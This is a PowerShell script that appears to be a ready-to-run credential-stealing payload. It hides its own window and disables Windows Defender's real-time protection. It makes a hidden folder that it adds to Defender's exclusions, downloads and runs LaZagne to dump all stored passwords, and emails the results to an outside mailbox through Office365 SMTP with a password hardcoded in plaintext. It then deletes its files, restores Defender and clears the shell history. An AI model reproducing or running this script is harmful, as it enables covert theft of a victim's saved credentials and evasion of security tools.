# Function from https://gist.github.com/lalibi/3762289efc5805f8cfcf (Hide Powershell Window)
function Set-WindowState {
    <#
    .LINK
    https://gist.github.com/Nora-Ballard/11240204
    #>

    [CmdletBinding(DefaultParameterSetName = 'InputObject')]
    param(
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [Object[]] $InputObject,

        [Parameter(Position = 1)]
        [ValidateSet('FORCEMINIMIZE', 'HIDE', 'MAXIMIZE', 'MINIMIZE', 'RESTORE',
                     'SHOW', 'SHOWDEFAULT', 'SHOWMAXIMIZED', 'SHOWMINIMIZED',
                     'SHOWMINNOACTIVE', 'SHOWNA', 'SHOWNOACTIVATE', 'SHOWNORMAL')]
        [string] $State = 'SHOW',
        [switch] $SuppressErrors = $false,
        [switch] $SetForegroundWindow = $false
    )

    Begin {
        $WindowStates = @{
        'FORCEMINIMIZE'         = 11
            'HIDE'              = 0
            'MAXIMIZE'          = 3
            'MINIMIZE'          = 6
            'RESTORE'           = 9
            'SHOW'              = 5
            'SHOWDEFAULT'       = 10
            'SHOWMAXIMIZED'     = 3
            'SHOWMINIMIZED'     = 2
            'SHOWMINNOACTIVE'   = 7
            'SHOWNA'            = 8
            'SHOWNOACTIVATE'    = 4
            'SHOWNORMAL'        = 1
        }

        $Win32ShowWindowAsync = Add-Type -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll", SetLastError = true)]
public static extern bool SetForegroundWindow(IntPtr hWnd);
'@ -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru

        if (!$global:MainWindowHandles) {
            $global:MainWindowHandles = @{ }
        }
    }

    Process {
        foreach ($process in $InputObject) {
            $handle = $process.MainWindowHandle

            if ($handle -eq 0 -and $global:MainWindowHandles.ContainsKey($process.Id)) {
                $handle = $global:MainWindowHandles[$process.Id]
            }

            if ($handle -eq 0) {
                if (-not $SuppressErrors) {
                    Write-Error "Main Window handle is '0'"
                }
                continue
            }

            $global:MainWindowHandles[$process.Id] = $handle

            $Win32ShowWindowAsync::ShowWindowAsync($handle, $WindowStates[$State]) | Out-Null
            if ($SetForegroundWindow) {
                $Win32ShowWindowAsync::SetForegroundWindow($handle) | Out-Null
            }

            Write-Verbose ("Set Window State '{1} on '{0}'" -f $MainWindowHandle, $State)
        }
    }
}

Set-Alias -Name 'Set-WindowStyle' -Value 'Set-WindowState'

# Disable real time protection
Set-MpPreference -DisableRealtimeMonitoring $true
# Minimize window 
Get-Process -ID $PID | Set-WindowState -State HIDE
# Create a tmp directory in the Downloads folder
$dir = "C:\Users\$env:UserName\Downloads\tmp"
New-Item -ItemType Directory -Path $dir
# Add an exception to Windows Defender for the tmp directory
Add-MpPreference -ExclusionPath $dir
#Hide the directory
$hide = Get-Item $dir -Force
$hide.attributes='Hidden'
# Download the executable
Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "$dir\lazagne.exe"
# Execute the executable and save output to a file
& "$dir\lazagne.exe" all > "$dir\output.txt"

# Define the username and password for your email account
$Username = "herbertswindel@outlook.com"  # Replace with your actual email address
$Password = ConvertTo-SecureString "HerbertdePervert69@" -AsPlainText -Force  # Replace with your actual password

# Create a PSCredential object
$MailCredentials = New-Object System.Management.Automation.PSCredential($Username, $Password)

# Define your email parameters and use the $MailCredentials variable for credentials
$EmailParams = @{
    From = @{ Name = 'Herbert Swindèl'; Email = 'herbertswindel@outlook.com' }
    To = 'herbertswindel@gmail.com'
    Server = 'smtp.office365.com'
    SecureSocketOptions = 'Auto'
    Credential = $MailCredentials
    HTML = $Body
    DeliveryNotificationOption = 'OnSuccess'
    Priority = 'High'
    Subject = 'This is another test email'
}

# Send the email using Send-EmailMessage
Send-EmailMessage @EmailParams

# You can also use Send-MailMessage with the same credentials
Send-MailMessage -To 'herbertswindel@gmail.com' -Subject 'Hier zijn uw gegevens kameraad!' -Body 'MVG, Herbert Swindèl' -SmtpServer 'smtp.office365.com' -From 'herbertswindel@outlook.com' `
    -Attachments "$dir\output.txt" -Encoding UTF8 -Cc 'herbertswindel@outlook.com' -DeliveryNotificationOption OnSuccess -Priority High -Credential $MailCredentials -UseSsl -Port 587 -Verbose


# Clean up
Remove-Item -Path $dir -Recurse -Force
Set-MpPreference -DisableRealtimeMonitoring $false
Remove-MpPreference -ExclusionPath $dir

# Remove the script from the system
Clear-History

